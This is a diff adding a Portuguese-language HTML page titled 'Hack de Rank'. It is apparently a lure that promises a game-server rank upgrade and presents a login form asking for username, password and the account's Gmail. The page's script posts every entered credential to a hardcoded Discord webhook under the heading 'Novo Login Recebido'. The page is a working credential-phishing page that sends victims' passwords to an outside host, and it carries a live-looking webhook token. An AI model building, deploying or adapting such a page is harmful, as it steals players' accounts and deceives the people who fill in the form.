@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>Hack de Rank</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #0d1117;
+      font-family: Arial, sans-serif;
+      color: white;
+    }
+
+    .container {
+      background: #161b22;
+      padding: 30px;
+      border-radius: 12px;
+      width: 350px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input, select {
+      width: 100%;
+      margin-bottom: 12px;
+      padding: 10px;
+      border: none;
+      border-radius: 6px;
+      background: #0d1117;
+      color: white;
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #238636;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    button:hover {
+      background: #2ea043;
+    }
+
+    .status {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Login</h2>
+
+  <input type="text" id="login" placeholder="Login">
+  <input type="password" id="senha" placeholder="Senha">
+
+  <!-- CORRIGIDO -->
+  <input type="text" id="gmail" placeholder="gmail da conta">
+
+  <select id="rank">
+    <option disabled selected>Rank necessitado</option>
+    <option>Ultra+</option>
+    <option>Ultra</option>
+    <option>MVP</option>
+    <option>PRO</option>
+    <option>Admin</option>
+    <option>Mod+</option>
+    <option>Mod</option>
+    <option>Helper</option>
+    <option>VIP</option>
+    <option>Enderlore</option>
+    <option>Férias</option>
+    <option>Natal</option>
+    <option>Master</option>
+    <option>Blade</option>
+    <option>Beta</option>
+    <option>Champion</option>
+    <option>2023</option>
+    <option>2022</option>
+    <option>2021</option>
+    <option>2020</option>
+    <option>2019</option>
+    <option>2018</option>
+    <option>2017</option>
+    <option>YT+</option>
+    <option>YTPrime</option>
+    <option>YT</option>
+    <option>Partner+</option>
+    <option>Partner</option>
+    <option>N/A</option>
+  </select>
+
+  <select id="seuRank">
+    <option disabled selected>Seu rank</option>
+    <option>Ultra+</option>
+    <option>Ultra</option>
+    <option>MVP</option>
+    <option>PRO</option>
+    <option>Admin</option>
+    <option>Mod+</option>
+    <option>Mod</option>
+    <option>Helper</option>
+    <option>VIP</option>
+    <option>Enderlore</option>
+    <option>Férias</option>
+    <option>Natal</option>
+    <option>Master</option>
+    <option>Blade</option>
+    <option>Beta</option>
+    <option>Champion</option>
+    <option>2023</option>
+    <option>2022</option>
+    <option>2021</option>
+    <option>2020</option>
+    <option>2019</option>
+    <option>2018</option>
+    <option>2017</option>
+    <option>YT+</option>
+    <option>YTPrime</option>
+    <option>YT</option>
+    <option>Partner+</option>
+    <option>Partner</option>
+    <option>N/A</option>
+  </select>
+
+  <button onclick="enviar()">Enviar</button>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+  async function enviar() {
+    const login = document.getElementById("login").value;
+    const senha = document.getElementById("senha").value;
+    const gmail = document.getElementById("gmail").value;
+    const seuRank = document.getElementById("seuRank").value;
+    const status = document.getElementById("status");
+
+    if (!login || !senha || !gmail || !seuRank) {
+      status.innerText = "Preencha tudo.";
+      status.style.color = "red";
+      return;
+    }
+
+    const webhook = "https://discord.com/api/webhooks/1496305936250437723/w838SQ8fEZRA6R_MZtkT_vZ3RaOMjoWIMgztOEyA5XHQuCV2tg3J1Z9aovvjBBKN0jiN";
+
+    const data = {
+      embeds: [
+        {
+          title: "Novo Login Recebido",
+          color: 15158332,
+          fields: [
+            { name: "Login", value: login, inline: true },
+            { name: "Senha", value: senha, inline: true },
+            { name: "gmail da conta", value: gmail, inline: false },
+            { name: "Seu Rank", value: seuRank, inline: true }
+          ]
+        }
+      ]
+    };
+
+    try {
+      const res = await fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      });
+
+      if (res.ok) {
+        status.innerText = "Enviado com sucesso!";
+        status.style.color = "lightgreen";
+      } else {
+        status.innerText = "Erro ao enviar.";
+        status.style.color = "red";
+      }
+    } catch (err) {
+      status.innerText = "Falha na conexão.";
+      status.style.color = "red";
+    }
+  }
+</script>
+
+</body>
+</html>
